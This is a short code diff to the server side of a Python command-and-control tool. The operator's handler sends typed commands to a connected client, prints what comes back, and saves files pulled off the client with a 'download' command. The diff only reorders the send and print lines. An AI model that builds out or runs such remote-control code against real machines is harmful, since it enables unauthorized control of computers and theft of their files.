@@ -9,6 +9,7 @@ def handle_client(client_socket):
 		try:
 			
 			command = input("C2> Enter a Command: ")
+			client_socket.send(command.encode())
 			if command.lower() == 'exit':
 				break
 			
@@ -24,9 +25,10 @@ def handle_client(client_socket):
 				print(output)
 				continue
 
-			client_socket.send(command.encode())
-
 			output = client_socket.recv(4096).decode()
+			
+			print(output)
+
 			if  command.startswith('download '):
 				output = base64.b64decode(output.encode())
 				filename = command[9:]
@@ -59,10 +61,11 @@ def handle_client(client_socket):
 						print(f"[+] File saved as {filename}")
 					except Exception as e:
 						print(f"[-] Failed to decode or save file: {e}")
-
 				if output == "":
 					output = "No output received."
-				print(output)
+					print(output)
+				
+				
 		except Exception as e:
 			print(f"An error occurred: {e}")
 			break
